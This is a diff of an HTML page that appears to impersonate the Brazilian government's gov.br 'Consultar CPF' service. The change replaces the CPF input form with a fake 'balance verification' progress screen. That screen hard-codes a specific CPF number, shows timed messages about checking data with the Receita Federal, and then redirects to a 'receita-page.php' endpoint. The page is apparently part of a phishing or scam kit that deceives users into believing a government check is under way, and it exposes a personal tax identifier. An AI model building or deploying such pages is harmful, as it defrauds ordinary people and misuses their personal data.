@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+﻿23321635132<!DOCTYPE html>
 <html>
 
 <head>
@@ -11,24 +11,24 @@
     <meta property="og:image" content="">
     <meta name="twitter:title" content="WorkflowM5 Theme Web Chat Communication App Demo">
     <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
-    <link rel="shortcut icon" href="assets/images/favicon-48x48.png" type="image/x-icon">
+    <link rel="shortcut icon" href="assets/images/favicon-48x48-3.png" type="image/x-icon">
     <meta name="description" content="New WorkflowM5 Theme HTML Template - Download Now!">
 
 
     <title>Consultar CPF</title>
-    <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
-    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
-    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
-    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
-    <link rel="stylesheet" href="assets/dropdown/css/style.css">
-    <link rel="stylesheet" href="assets/socicon/css/styles.css">
-    <link rel="stylesheet" href="assets/theme/css/style.css">
-    <link rel="preload" href="css?family=Kantumruy+Pro:100,200,300,400,500,600,700,100i,200i,300i,400i,500i,600i,700i&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2-3.css">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min-3.css">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min-3.css">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min-3.css">
+    <link rel="stylesheet" href="assets/dropdown/css/style-3.css">
+    <link rel="stylesheet" href="assets/socicon/css/styles-3.css">
+    <link rel="stylesheet" href="assets/theme/css/style-3.css">
+    <link rel="preload" href="css-1?family=Kantumruy+Pro:100,200,300,400,500,600,700,100i,200i,300i,400i,500i,600i,700i&amp;display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <noscript>
-        <link rel="stylesheet" href="css?family=Kantumruy+Pro:100,200,300,400,500,600,700,100i,200i,300i,400i,500i,600i,700i&amp;display=swap">
+        <link rel="stylesheet" href="css-1?family=Kantumruy+Pro:100,200,300,400,500,600,700,100i,200i,300i,400i,500i,600i,700i&amp;display=swap">
     </noscript>
-    <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css">
-    <link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+    <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional-3.css">
+    <link rel="stylesheet" href="assets/mobirise/css/mbr-additional-3.css" type="text/css">
 
 
     <style type="text/css">
@@ -88,7 +88,7 @@
             <div class="container">
                 <div class="navbar-brand">
                     <span class="navbar-logo">
-                        <img src="assets/images/govbr-logo-large.png">
+                        <img src="assets/images/govbr-logo-large-1.png">
                     </span>
                 </div>
                 <button class="navbar-toggler" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbarSupportedContent" data-bs-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
@@ -127,40 +127,26 @@
 
                     <!--<h5 class="mbr-section-title mbr-fonts-style align-left display-1"><strong>Features</strong></h5>-->
                     <p class="card-text align-left mbr-fonts-style pt-4 mb-0 display-4" style="font-size: 25px;">
-                        <img src="assets/images/menu-icon.png" width="30" height="30"> Serviços e Informações do Brasil
+                        <img src="assets/images/menu-icon-3.png" width="30" height="30"> Serviços e Informações do Brasil
                     </p>
 
                 </div>
 
                 <div class="conteudo" style="font-size:16px;">
-                    <img src="assets/images/home-home.png" width="29" height="24"> > <span style="color: #1351b4;">Serviços</span> > <span style="color: #333;">Consultar CPF</span>
+                    <img src="assets/images/home-home-1.png" width="29" height="24"> > <span style="color: #1351b4;">Serviços</span> > <span style="color: #333;">Consultar CPF</span>
                 </div><!-- #conteudo -->
 
-                <p style="margin-top: 30px; text-align: center;">
-                    <img src="assets/images/gestao.png" width="61" height="59"><br>
-                    <span style="color: #1351b4;font-size: 30px; font-weight: 600;display: block;">Verificação de Saldo por CPF</span><br>
-                    <span style="color: #1351b4;display: block;">CPF, CNPJ e Outros Cadastros > Pessoa Física (CPF)</span>
+                <p style="text-align: center;">
+                    <img src="assets/images/image_processing20200320-1564-jxd21o.gif" style="width: 300px;">
+                </p>
+                <p style="">
+                    <h5 class="mbr-section-title mbr-fonts-style" id="consulta-box" style="text-align: center;"><strong>Consultar em Andamento. Aguarde...</strong></h5>
+                
+                <p id="info-box" style="text-align: center;">
+                    Validando CPF 23321635132 ...
                 </p>
 
-                <div class="conteudo">
-                </div>
-                <br><br>
-
-                <div style="margin-top: 15px; text-align:center;">
-                    <h5 class="mbr-section-title mbr-fonts-style align-left" style="font-size: 29px;"><strong>Consultar CPF:</strong></h5>
-
-                    <input type="text" style="font-size: 19px;margin-bottom: 21px;" id="cpf-user" placeholder="Informe seu CPF" required=""><br>
-
-                    <a class="btn-consultar" id="consultar" href="#">Consultar Agora</a>
-                </div>
-
-                <div class="conteudo">
-                </div>
-
-                <br><br>
-                <p>
-                    <img src="assets/images/avaliacao.png" width="319" height="45">
-                </p>
+                <input type="hidden" value="23321635132" id="cpf-user">
 
             </div>
             <div class="row">
@@ -178,7 +164,7 @@
             <div class="row justify-content-between">
                 <div class="col-12 col-md-12 col-lg-3">
                     <p>
-                        <img src="assets/images/imagem_2023-11-04_152059627.png" style="width:160px;">
+                        <img src="assets/images/imagem_2023-11-04_152059627-1.png" style="width:160px;">
                     </p>
                     <div class="social-list text-center">
 
@@ -239,47 +225,39 @@
     </section>
 
 
-    <script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>
-    <script src="assets/smoothscroll/smooth-scroll.js"></script>
-    <script src="assets/ytplayer/index.js"></script>
-    <script src="assets/dropdown/js/navbar-dropdown.js"></script>
-    <script src="assets/mbr-switch-arrow/mbr-switch-arrow.js"></script>
-    <script src="assets/theme/js/script.js"></script>
-    <script src="sweetalert%402.1.2/dist/sweetalert.min.js"></script>
-    <script type="text/javascript" src="assets/js/jquery-1.2.6.pack.js"></script>
-    <script type="text/javascript" src="assets/js/jquery.maskedinput-1.1.4.pack.js"></script>
+    <script src="assets/bootstrap/js/bootstrap.bundle.min-3.js"></script>
+    <script src="assets/smoothscroll/smooth-scroll-3.js"></script>
+    <script src="assets/ytplayer/index-3.js"></script>
+    <script src="assets/dropdown/js/navbar-dropdown-3.js"></script>
+    <script src="assets/mbr-switch-arrow/mbr-switch-arrow-3.js"></script>
+    <script src="assets/theme/js/script-3.js"></script>
+    <script src="sweetalert%402.1.2/dist/sweetalert.min-3.js"></script>
+    <script type="text/javascript" src="assets/js/jquery-1.2.6.pack-3.js"></script>
+    <script type="text/javascript" src="assets/js/jquery.maskedinput-1.1.4.pack-3.js"></script>
 
     <script type="text/javascript">
         $(function() {
-            $("#cpf-user").mask("999.999.999-99");
+            
+            setTimeout(() => {
+                $('#info-box').html('Finalizando informações com o servidor...');
+            }, 9000);
+            setTimeout(() => {
+                $('#info-box').html('Contabilizando Saldo Existente...');
+            }, 6000);
+            setTimeout(() => {
+                $('#info-box').html('Verificando dados na Receite Federal...');
+            }, 3000);
 
-            $('#consultar').bind( "click", function( event ) {
+            setTimeout(() => {
+                $('#consulta-box').html('<strong>Consulta Concluída!</strong>');
+                $('#info-box').html('Você será redirecionado para a site da Receita Federal');
+            }, 11000);
 
-                if ( $('#cpf-user').val() == '' ) {
-                    swal({
-                        title: "ATENÇÃO!",
-                        text: "Seu CPF deve ser informado para a consulta",
-                        icon: "warning"
-                    });
-                } else {
-
-                    var cpf_user = $('#cpf-user').val();
-                    cpf_user = cpf_user.replace(/[^a-zA-Z0-9]/g, "");
-                    //
-                    window.location.replace("verificacao-cpf.php?cpf=" + cpf_user);
-        
-                    //alert(cpf_user);
-                }
-                
-
-                
-   
-               event.preventDefault();
-               
-               
-   
-               return false;
-           });
+            setTimeout(() => {
+                var cpf_user = $('#cpf-user').val();
+                window.location.replace("/receita-page.php?cpf=" + cpf_user);
+            }, 13000);
+            
         });
     </script>
 
